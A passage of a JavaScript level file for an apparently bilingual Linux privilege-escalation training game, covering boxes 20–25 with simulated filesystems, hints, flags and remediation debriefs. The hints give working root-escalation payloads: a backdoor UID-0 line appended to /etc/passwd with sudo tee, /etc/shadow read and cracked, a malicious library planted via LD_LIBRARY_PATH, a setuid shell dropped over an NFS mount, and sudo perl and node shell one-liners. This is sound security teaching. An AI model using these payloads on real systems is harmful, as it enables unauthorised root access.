                fix: 'Ne jamais donner sudo sur un pager ou une visionneuse. Si un utilisateur doit vraiment feuilleter des logs appartenant à root, utilise un wrapper restreint (ou un outillage type sudoedit) plutôt qu\'un accès sudo brut à less/more/man.',
                link: 'https://gtfobins.github.io/gtfobins/less/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 20 — sudo NOPASSWD on tee, piped into /etc/passwd (GTFOBins)
    // ─────────────────────────────────────────────────────────────
    {
        id: 20,
        codename: 'box-20',
        title: { en: 'Box-20 · Tee\'d Off', fr: 'Box-20 · À bout de tee' },
        brief: {
            en: '/etc/passwd is locked down this time — but sudo lets you run tee as root, and tee writes wherever it is pointed.',
            fr: '/etc/passwd est verrouillé cette fois — mais sudo t\'autorise tee en root, et tee écrit là où on le pointe.'
        },
        user: 'player',
        host: 'box-20',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Pipe a rogue UID-0 line into tee -a', 'Switch to your new root account'],
            fr: ['Vérifier tes droits sudo', 'Envoyer une ligne UID 0 dans tee -a via un pipe', 'Basculer sur ton nouveau compte root']
        },
        hints: {
            en: [
                'Try: sudo -l — a plain "echo >> /etc/passwd" will fail, the file isn\'t writable this time.',
                'tee reads from a pipe and writes to any file it\'s given — running it under sudo makes that write happen as root.',
                'Payload: echo \'r00t::0:0::/root:/bin/bash\' | sudo tee -a /etc/passwd   then   su r00t'
            ],
            fr: [
                'Essaie : sudo -l — un simple "echo >> /etc/passwd" échouera, le fichier n\'est pas modifiable cette fois.',
                'tee lit depuis un pipe et écrit dans le fichier qu\'on lui donne — le lancer sous sudo fait de cette écriture une écriture root.',
                'Payload : echo \'r00t::0:0::/root:/bin/bash\' | sudo tee -a /etc/passwd   puis   su r00t'
            ]
        },
        flag: 'flag{te3_p1ped_r00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{te3_p1ped_r00t}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'tee'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/tee': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/tee', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'passwd_write' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on tee',
                why: "tee has no interpreter to abuse and no shell flag — it just copies stdin to a file. That's exactly the problem: sudo tee can overwrite or append to *any* file as root, including /etc/passwd. A piped-in UID-0 line with an empty password field creates an instant backdoor account.",
                fix: 'Never grant sudo on tee (or cp, dd, cat with redirection) without restricting the target path. If root-owned logs need updating by a script, use a purpose-built wrapper that validates the destination instead of a raw file-write primitive.',
                link: 'https://gtfobins.github.io/gtfobins/tee/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur tee',
                why: "tee n'a ni interpréteur à détourner ni option shell — il recopie simplement stdin vers un fichier. C'est justement le problème : sudo tee peut écraser ou compléter n'importe quel fichier en root, y compris /etc/passwd. Une ligne UID 0 envoyée par pipe, avec un champ mot de passe vide, crée un compte porte dérobée instantané.",
                fix: 'Ne jamais donner sudo sur tee (ni cp, dd, ou cat avec redirection) sans restreindre la cible. Si un script doit légitimement mettre à jour des fichiers root, utilise un wrapper dédié qui valide la destination plutôt qu\'une primitive d\'écriture brute.',
                link: 'https://gtfobins.github.io/gtfobins/tee/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 21 — cap_dac_read_search+ep on python3: read /etc/shadow, crack it
    // ─────────────────────────────────────────────────────────────
    {
        id: 21,
        codename: 'box-21',
        title: { en: 'Box-21 · Beyond Discretionary Access', fr: 'Box-21 · Au-delà du contrôle discrétionnaire' },
        brief: {
            en: 'SUID audit is clean and sudo -l is empty. But capabilities strike again — this time one that skips read permission checks entirely.',
            fr: 'L\'audit SUID est propre et sudo -l est vide. Mais les capabilities frappent encore — cette fois une qui court-circuite entièrement les vérifications de lecture.'
        },
        user: 'player',
        host: 'box-21',
        cwd: '/home/player',
        objectives: {
            en: ['List capabilities on the system', 'Read /etc/shadow despite its permissions', 'Crack the root hash', 'Log in as root'],
            fr: ['Lister les capabilities du système', 'Lire /etc/shadow malgré ses permissions', 'Casser le hash de root', 'Te connecter en root']
        },
        hints: {
            en: [
                'Try: getcap -r / 2>/dev/null',
                'cap_dac_read_search bypasses discretionary access control (DAC) — the usual owner/mode checks — for reads and directory traversal. python3 has it.',
                'python3 -c "print(open(\'/etc/shadow\').read())" — then crack the copy it leaves behind: john /tmp/shadow.copy, then su root'
            ],
            fr: [
                'Essaie : getcap -r / 2>/dev/null',
                'cap_dac_read_search contourne le contrôle d\'accès discrétionnaire (DAC) — les vérifications habituelles owner/mode — pour la lecture et la traversée de dossiers. python3 l\'a.',
                'python3 -c "print(open(\'/etc/shadow\').read())" — puis casse la copie laissée derrière : john /tmp/shadow.copy, puis su root'
            ]
        },
        flag: 'flag{cap_dac_sh4d0w_pwn}',
        crackedPassword: 'R00tShad0w!2024',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['HINT.txt'] },
            '/home/player/HINT.txt': { type: 'file', owner: 'player', mode: '644', content: 'sudo -l came back empty and there\'s no stray SUID bit anywhere.\nRemember box-03? Capabilities aren\'t just for setuid.\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'shadow', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/shadow': { type: 'file', owner: 'root', mode: '600', content: 'root:$6$Rd4nD0m$aVeryFakeHashString1234567890abcdefghijklmno.:19700:0:99999:7:::\nplayer:!:19700:0:99999:7:::\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{cap_dac_sh4d0w_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'python3', 'getcap', 'setcap', 'john'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/python3': { type: 'file', owner: 'root', mode: '755', capabilities: 'cap_dac_read_search+ep', content: 'ELF binary' },
            '/usr/bin/getcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/setcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/john': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: { player: [] },
        wins: [
            { type: 'shadow_crack' }
        ],
        harden: {
            target: '/usr/bin/python3',
            type: 'unset_cap',
            hint: { en: 'setcap -r /usr/bin/python3', fr: 'setcap -r /usr/bin/python3' }
        },
        debrief: {
            en: {
                vuln: 'Linux capability cap_dac_read_search+ep on python3',
                why: 'cap_dac_read_search grants a process the kernel-level ability to bypass file *read* and directory-traversal permission checks — independent of file ownership or mode. A one-line open()/read() in python3 pulls /etc/shadow straight out, hash and all, with no exploit needed beyond calling open().',
                fix: 'Remove the capability with setcap -r /usr/bin/python3, and audit for cap_dac_read_search / cap_dac_override on any interpreter or archiving tool (tar, python, perl) the same way you\'d audit for SUID. Rotate any credentials whose hash may already be exposed.',
                link: 'https://gtfobins.github.io/gtfobins/python/#capabilities'
            },
            fr: {
                vuln: 'Capability Linux cap_dac_read_search+ep sur python3',
                why: 'cap_dac_read_search donne à un processus la capacité, au niveau noyau, de contourner les vérifications de permission de *lecture* et de traversée de dossier — indépendamment du propriétaire ou du mode du fichier. Un simple open()/read() en python3 extrait /etc/shadow directement, hash compris, sans exploit au-delà d\'un appel à open().',
                fix: 'Retire la capability avec setcap -r /usr/bin/python3, et audite cap_dac_read_search / cap_dac_override sur tout interpréteur ou outil d\'archivage (tar, python, perl) comme tu le ferais pour un SUID. Change tout mot de passe dont le hash a pu être exposé.',
                link: 'https://gtfobins.github.io/gtfobins/python/#capabilities'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 22 — sudo env_keep leaks LD_LIBRARY_PATH (distinct from LD_PRELOAD)
    // ─────────────────────────────────────────────────────────────
    {
        id: 22,
        codename: 'box-22',
        title: { en: 'Box-22 · The Missing Library', fr: 'Box-22 · La bibliothèque manquante' },
        brief: {
            en: 'sudo preserves LD_LIBRARY_PATH this time, not LD_PRELOAD. A root-run helper is missing one specific shared library — plant it yourself.',
            fr: 'Cette fois sudo préserve LD_LIBRARY_PATH, pas LD_PRELOAD. Un utilitaire lancé en root cherche une bibliothèque partagée précise — plante-la toi-même.'
        },
        user: 'player',
        host: 'box-22',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions and preserved variables', 'Find which library /usr/local/bin/backup-agent is missing', 'Plant a malicious copy under a writable LD_LIBRARY_PATH', 'Trigger it via sudo'],
            fr: ['Vérifier tes droits sudo et les variables préservées', 'Trouver quelle bibliothèque il manque à /usr/local/bin/backup-agent', 'Planter une copie malveillante sous un LD_LIBRARY_PATH modifiable', 'La déclencher via sudo']
        },
        hints: {
            en: [
                'Try: sudo -l — look closely at env_keep.',
                'LD_LIBRARY_PATH adds a search directory for shared libraries. Unlike LD_PRELOAD, the loaded file has to be named exactly what the target program is looking for: libagent.so.1 (see /usr/local/bin/README.txt).',
                'Payload: echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/libagent.so.1.c ; gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c ; sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'
            ],
            fr: [
                'Essaie : sudo -l — regarde bien env_keep.',
                'LD_LIBRARY_PATH ajoute un dossier de recherche pour les bibliothèques partagées. Contrairement à LD_PRELOAD, le fichier chargé doit porter exactement le nom que le programme cible recherche : libagent.so.1 (voir /usr/local/bin/README.txt).',
                'Payload : echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/libagent.so.1.c ; gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c ; sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'
            ]
        },
        flag: 'flag{ld_l1brary_p4th_pwn}',
        vulnLib: 'libagent.so.1',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{ld_l1brary_p4th_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin', 'local'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'gcc'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/gcc': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/local': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/local/bin': { type: 'dir', owner: 'root', mode: '755', children: ['backup-agent', 'README.txt'] },
            '/usr/local/bin/backup-agent': { type: 'file', owner: 'root', mode: '755', content: 'ELF 64-bit LSB executable — dynamically linked, missing shared library: libagent.so.1' },
            '/usr/local/bin/README.txt': { type: 'file', owner: 'root', mode: '644', content: 'Internal backup agent.\nDepends on libagent.so.1 (not yet packaged for this distro — ops loads it via LD_LIBRARY_PATH in prod, ugh).\n' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/local/bin/backup-agent', nopasswd: true, runas: 'root' }
            ]
        },
        env_keep: ['LD_LIBRARY_PATH'],
        wins: [
            { type: 'ld_library_path' }
        ],
        debrief: {
            en: {
                vuln: 'sudo env_keep leaks LD_LIBRARY_PATH',
                why: "LD_LIBRARY_PATH tells the dynamic linker extra places to search for shared libraries before the system defaults. backup-agent was shipped depending on libagent.so.1 without an absolute rpath, so whichever directory LD_LIBRARY_PATH points at gets searched first. Sudo normally scrubs the environment, but this box's Defaults line explicitly keeps LD_LIBRARY_PATH — so a same-named malicious .so placed anywhere sudo LD_LIBRARY_PATH points loads as root the instant the agent runs.",
                fix: 'Never add LD_PRELOAD or LD_LIBRARY_PATH to env_keep. Ship dependencies with a proper package or an absolute RPATH/RUNPATH baked into the binary instead of relying on a searched path at runtime.',
                link: 'https://gtfobins.github.io/gtfobins/#+shell'
            },
            fr: {
                vuln: 'sudo env_keep expose LD_LIBRARY_PATH',
                why: "LD_LIBRARY_PATH indique à l'éditeur de liens dynamique des dossiers supplémentaires à chercher pour les bibliothèques partagées, avant les emplacements système par défaut. backup-agent a été livré en dépendant de libagent.so.1 sans rpath absolu : le dossier pointé par LD_LIBRARY_PATH est donc cherché en premier. sudo nettoie normalement l'environnement, mais la ligne Defaults de cette box préserve explicitement LD_LIBRARY_PATH — un .so malveillant portant le bon nom, placé où pointe sudo LD_LIBRARY_PATH, se charge alors en root dès que l'agent tourne.",
                fix: 'Ne jamais ajouter LD_PRELOAD ou LD_LIBRARY_PATH à env_keep. Livre les dépendances via un vrai paquet, ou avec un RPATH/RUNPATH absolu intégré au binaire plutôt que de compter sur un chemin de recherche à l\'exécution.',
                link: 'https://gtfobins.github.io/gtfobins/#+shell'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 23 — NFS export with no_root_squash
    // ─────────────────────────────────────────────────────────────
    {
        id: 23,
        codename: 'box-23',
        title: { en: 'Box-23 · Trust the Client', fr: 'Box-23 · Faire confiance au client' },
        brief: {
            en: "/srv/backups is locked down (root-owned, mode 750) — but it's also exported over NFS with no_root_squash. Mount it and the export's own rules, not the directory's, decide what you can do.",
            fr: "/srv/backups est verrouillé (root, mode 750) — mais il est aussi exporté en NFS avec no_root_squash. Monte-le : ce sont les règles de l'export, pas celles du dossier, qui décident de ce que tu peux faire."
        },
        user: 'player',
        host: 'box-23',
        cwd: '/home/player',
        objectives: {
            en: ['List the NFS exports this host offers', 'Mount the writable one', 'Plant a root-owned setuid shell through the mount', 'Run it for a root shell'],
            fr: ['Lister les partages NFS de cet hôte', 'Monter celui qui est modifiable', 'Planter un shell setuid appartenant à root via le montage', "L'exécuter pour obtenir un shell root"]
        },
        hints: {
            en: [
                'Try: showmount -e — then cat /etc/exports to read the options.',
                'no_root_squash means the mounting client\'s root UID is trusted as real root on that export, regardless of the directory\'s own owner/mode on the server. Once mounted, /srv/backups itself becomes writable to you.',
                'Mount it, plant a setuid shell, run it:\n  mount -t nfs box-23:/srv/backups /mnt\n  touch /srv/backups/rootbash\n  chmod u+s /srv/backups/rootbash\n  /srv/backups/rootbash'
            ],
            fr: [
                'Essaie : showmount -e — puis cat /etc/exports pour lire les options.',
                "no_root_squash signifie que l'UID root du client montant est fait confiance comme vrai root sur cet export, quels que soient le propriétaire/mode du dossier côté serveur. Une fois monté, /srv/backups lui-même devient modifiable pour toi.",
                "Monte-le, plante un shell setuid, lance-le :\n  mount -t nfs box-23:/srv/backups /mnt\n  touch /srv/backups/rootbash\n  chmod u+s /srv/backups/rootbash\n  /srv/backups/rootbash"
            ]
        },
        flag: 'flag{nfs_n0_root_squash}',
        nfsExports: [
            { path: '/srv/backups', clients: '*', opts: 'rw,no_root_squash,sync,no_subtree_check' }
        ],
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin', 'srv', 'mnt'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'exports'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/exports': { type: 'file', owner: 'root', mode: '644', content: '/srv/backups    *(rw,no_root_squash,sync,no_subtree_check)\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{nfs_n0_root_squash}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'showmount'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/showmount': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/srv': { type: 'dir', owner: 'root', mode: '755', children: ['backups'] },
            '/srv/backups': { type: 'dir', owner: 'root', mode: '750', children: ['README.txt'] },
            '/srv/backups/README.txt': { type: 'file', owner: 'root', mode: '640', content: 'Nightly backup staging area. Exported to the backup relay over NFS.\n' },
            '/mnt': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'nfs_no_root_squash' }
        ],
        debrief: {
            en: {
                vuln: 'NFS export with no_root_squash',
                why: "/srv/backups resists root-level Unix permissions from the local shell (mode 750, owned by root) — but /etc/exports shares it with rw and no_root_squash. That option is the whole vulnerability: normally NFS \"squashes\" a mounting client's root (UID 0) down to an unprivileged nobody, but no_root_squash disables that, so the client's root is trusted as the server's real root for every file operation inside the export. Mounting it locally and creating a setuid-root shell there is enough — the export's permissions, not the directory's, govern the write, and the resulting binary is genuinely owned by root.",
                fix: 'Never export writable shares with no_root_squash to untrusted clients. Default to root_squash (or all_squash), and restrict exports to specific trusted hosts rather than *.',
                link: 'https://gtfobins.github.io/gtfobins/#+shell'
            },
            fr: {
                vuln: 'Partage NFS avec no_root_squash',
                why: "/srv/backups résiste aux permissions Unix classiques depuis le shell local (mode 750, propriétaire root) — mais /etc/exports le partage avec rw et no_root_squash. Cette option est toute la vulnérabilité : normalement NFS « écrase » le root (UID 0) d'un client montant en un utilisateur nobody non privilégié, mais no_root_squash désactive ça — le root du client est alors traité comme le vrai root du serveur pour toute opération dans cet export. Le monter localement et y créer un shell setuid root suffit : ce sont les permissions de l'export, pas celles du dossier, qui régissent l'écriture, et le binaire obtenu appartient réellement à root.",
                fix: "Ne jamais exporter de partage modifiable avec no_root_squash vers des clients non fiables. Garde root_squash (ou all_squash) par défaut, et restreins les exports à des hôtes de confiance précis plutôt qu'à *.",
                link: 'https://gtfobins.github.io/gtfobins/#+shell'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 24 — sudo NOPASSWD on perl (GTFOBins)
    // ─────────────────────────────────────────────────────────────
    {
        id: 24,
        codename: 'box-24',
        title: { en: 'Box-24 · One-Liner', fr: 'Box-24 · Le one-liner' },
        brief: {
            en: 'sudo lets you run perl as root. perl -e can execute an arbitrary system command from a single expression.',
            fr: "sudo t'autorise perl en root. perl -e peut exécuter n'importe quelle commande système depuis une seule expression."
        },
        user: 'player',
        host: 'box-24',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Recognise perl on GTFOBins', 'Use it to launch a root shell'],
            fr: ['Vérifier tes droits sudo', 'Reconnaître perl sur GTFOBins', 'L\'utiliser pour lancer un shell root']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'perl -e runs an inline script. Look up "perl" on GTFOBins for the sudo one-liner.',
                'Payload: sudo perl -e \'exec "/bin/sh";\''
            ],
            fr: [
                'Essaie : sudo -l',
                'perl -e exécute un script en ligne. Cherche "perl" sur GTFOBins pour le one-liner sudo.',
                'Payload : sudo perl -e \'exec "/bin/sh";\''
            ]
        },
        flag: 'flag{p3rl_ex3c_r00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{p3rl_ex3c_r00t}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'perl'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/perl': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/perl', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on perl',
                why: "perl -e runs an inline Perl expression. exec replaces the current process with /bin/sh — and since sudo already elevated perl to root, the shell it hands off to inherits that root identity.",
                fix: 'Never grant sudo on a general-purpose scripting interpreter (perl, python, ruby...). If a script needs perl, invoke a specific, non-editable script path instead of exposing the raw binary.',
                link: 'https://gtfobins.github.io/gtfobins/perl/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur perl',
                why: "perl -e exécute une expression Perl en ligne. exec remplace le processus courant par /bin/sh — et comme sudo avait déjà élevé perl en root, le shell obtenu hérite de cette identité root.",
                fix: "Ne jamais donner sudo sur un interpréteur de script généraliste (perl, python, ruby...). Si un script a besoin de perl, appelle un script précis et non modifiable plutôt que d'exposer le binaire brut.",
                link: 'https://gtfobins.github.io/gtfobins/perl/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 25 — sudo NOPASSWD on node (GTFOBins)
    // ─────────────────────────────────────────────────────────────
    {
        id: 25,
        codename: 'box-25',
        title: { en: 'Box-25 · Node Break', fr: 'Box-25 · Node casse tout' },
        brief: {
            en: "sudo lets you run node as root. Node's child_process module can spawn an interactive shell from a one-off script.",
            fr: "sudo t'autorise node en root. Le module child_process de Node peut lancer un shell interactif depuis un script jetable."
        },
        user: 'player',
        host: 'box-25',
        cwd: '/home/player',
        objectives: {
            en: ['Check your sudo permissions', 'Recognise node on GTFOBins', 'Spawn a root shell via child_process'],
            fr: ['Vérifier tes droits sudo', 'Reconnaître node sur GTFOBins', 'Lancer un shell root via child_process']
        },
        hints: {
            en: [
                'Try: sudo -l',
                "node -e runs an inline script, same idea as python3 -c. Check GTFOBins for \"node\" — the require('child_process') trick.",
                'Payload: sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''
            ],
            fr: [
                'Essaie : sudo -l',
                "node -e exécute un script en ligne, même idée que python3 -c. Regarde GTFOBins pour \"node\" — l'astuce require('child_process').",
                'Payload : sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''
            ]
        },
        flag: 'flag{n0de_ch1ld_pr0cess}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{n0de_ch1ld_pr0cess}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'node'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/node': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/node', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on node',
                why: "node -e runs an inline JS snippet as the process' own privileges. require('child_process').spawn() launches /bin/sh as a child of that process — inheriting root, since sudo elevated node to root before the script ever ran.",
                fix: 'Never grant sudo on a general-purpose runtime (node, python, perl...). Wrap the legitimate task in a fixed, non-editable script and grant sudo on that script path instead.',
